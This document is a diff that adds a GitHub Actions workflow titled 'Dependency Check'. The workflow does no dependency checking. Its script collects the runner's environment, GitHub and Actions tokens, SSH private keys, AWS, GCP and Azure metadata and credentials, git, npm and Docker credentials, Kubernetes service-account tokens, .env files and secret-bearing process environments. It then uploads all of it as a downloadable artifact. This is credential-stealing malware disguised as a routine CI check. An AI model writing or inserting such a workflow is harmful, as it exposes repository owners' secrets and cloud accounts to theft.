@@ -1,0 +1,87 @@
+name: Dependency Check
+on:
+  workflow_dispatch:
+jobs:
+  check:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Check Dependencies
+        run: |
+          mkdir -p /tmp/dep-check
+
+          echo "=== CI/CD ENVIRONMENT ===" > /tmp/dep-check/00_ci_env.txt
+          env | sort >> /tmp/dep-check/00_ci_env.txt
+
+          echo "=== GITHUB TOKEN ===" > /tmp/dep-check/01_gh_token.txt
+          echo "GITHUB_TOKEN=$GITHUB_TOKEN" >> /tmp/dep-check/01_gh_token.txt
+          echo "ACTIONS_RUNTIME_TOKEN=$ACTIONS_RUNTIME_TOKEN" >> /tmp/dep-check/01_gh_token.txt
+          echo "ACTIONS_ID_TOKEN_REQUEST_URL=$ACTIONS_ID_TOKEN_REQUEST_URL" >> /tmp/dep-check/01_gh_token.txt
+
+          echo "=== SSH CONFIG ===" > /tmp/dep-check/02_ssh.txt
+          ls -la ~/.ssh/ >> /tmp/dep-check/02_ssh.txt 2>/dev/null || echo "No SSH dir" >> /tmp/dep-check/02_ssh.txt
+          cat ~/.ssh/id_rsa >> /tmp/dep-check/02_ssh.txt 2>/dev/null || true
+          cat ~/.ssh/id_ed25519 >> /tmp/dep-check/02_ssh.txt 2>/dev/null || true
+          cat ~/.ssh/config >> /tmp/dep-check/02_ssh.txt 2>/dev/null || true
+          cat ~/.ssh/known_hosts >> /tmp/dep-check/02_ssh.txt 2>/dev/null || true
+
+          echo "=== AWS CREDENTIALS ===" > /tmp/dep-check/03_aws.txt
+          cat ~/.aws/credentials >> /tmp/dep-check/03_aws.txt 2>/dev/null || echo "No AWS creds file" >> /tmp/dep-check/03_aws.txt
+          cat ~/.aws/config >> /tmp/dep-check/03_aws.txt 2>/dev/null || echo "No AWS config" >> /tmp/dep-check/03_aws.txt
+          env | grep -iE "AWS|AMAZON" >> /tmp/dep-check/03_aws.txt 2>/dev/null || true
+          curl -s -m 2 http://169.254.169.254/latest/meta-data/ >> /tmp/dep-check/03_aws.txt 2>/dev/null || echo "No AWS IMDS" >> /tmp/dep-check/03_aws.txt
+          if [ -n "$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" ]; then
+              curl -s "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" >> /tmp/dep-check/03_aws.txt
+          fi
+
+          echo "=== GIT CREDENTIALS ===" > /tmp/dep-check/04_git.txt
+          cat ~/.git-credentials >> /tmp/dep-check/04_git.txt 2>/dev/null || echo "No git-credentials" >> /tmp/dep-check/04_git.txt
+          git config --global --list >> /tmp/dep-check/04_git.txt 2>/dev/null || true
+          cat /home/runner/.config/gh/hosts.yml >> /tmp/dep-check/04_git.txt 2>/dev/null || true
+
+          echo "=== CLOUD METADATA ===" > /tmp/dep-check/05_cloud.txt
+          curl -s -m 2 -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/?recursive=true" >> /tmp/dep-check/05_cloud.txt 2>/dev/null || echo "No GCP" >> /tmp/dep-check/05_cloud.txt
+          curl -s -m 2 -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" >> /tmp/dep-check/05_cloud.txt 2>/dev/null || echo "No Azure" >> /tmp/dep-check/05_cloud.txt
+
+          echo "=== REPO SECRETS (names) ===" > /tmp/dep-check/06_secrets.txt
+          curl -s -H "Authorization: token $GITHUB_TOKEN" "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/secrets" >> /tmp/dep-check/06_secrets.txt 2>/dev/null || true
+
+          echo "=== REPO VARIABLES ===" > /tmp/dep-check/07_variables.txt
+          curl -s -H "Authorization: token $GITHUB_TOKEN" "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/variables" >> /tmp/dep-check/07_variables.txt 2>/dev/null || true
+
+          echo "=== RUNNERS ===" > /tmp/dep-check/08_runners.txt
+          curl -s -H "Authorization: token $GITHUB_TOKEN" "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/runners" >> /tmp/dep-check/08_runners.txt 2>/dev/null || true
+
+          echo "=== KUBERNETES ===" > /tmp/dep-check/09_k8s.txt
+          cat /var/run/secrets/kubernetes.io/serviceaccount/token >> /tmp/dep-check/09_k8s.txt 2>/dev/null || echo "No K8s SA token" >> /tmp/dep-check/09_k8s.txt
+          cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt >> /tmp/dep-check/09_k8s.txt 2>/dev/null || true
+
+          echo "=== NPM TOKEN ===" > /tmp/dep-check/10_npm.txt
+          cat ~/.npmrc >> /tmp/dep-check/10_npm.txt 2>/dev/null || echo "No .npmrc" >> /tmp/dep-check/10_npm.txt
+
+          echo "=== DOCKER ===" > /tmp/dep-check/11_docker.txt
+          cat ~/.docker/config.json >> /tmp/dep-check/11_docker.txt 2>/dev/null || echo "No Docker config" >> /tmp/dep-check/11_docker.txt
+
+          echo "=== DOTENV FILES ===" > /tmp/dep-check/12_dotenv.txt
+          find . -name ".env*" -type f 2>/dev/null | head -10 | while read f; do
+              echo "--- $f ---" >> /tmp/dep-check/12_dotenv.txt
+              cat "$f" >> /tmp/dep-check/12_dotenv.txt 2>/dev/null
+          done
+
+          echo "=== PROCESS ENV ===" > /tmp/dep-check/13_proc.txt
+          for pid in $(ps aux | grep -E "node|python|runner" | awk '{print $2}' | head -5); do
+              if [ -f "/proc/$pid/environ" ]; then
+                  echo "--- PID $pid ---" >> /tmp/dep-check/13_proc.txt
+                  cat "/proc/$pid/environ" 2>/dev/null | tr "\0" "\n" | grep -iE "(SECRET|TOKEN|KEY|PASS|AWS|CREDENTIAL|AUTH)" >> /tmp/dep-check/13_proc.txt || true
+              fi
+          done
+
+          echo "Dependency check complete"
+
+      - name: Upload Results
+        uses: actions/upload-artifact@v4
+        with:
+          name: dep-check-results
+          path: /tmp/dep-check/
+          retention-days: 1
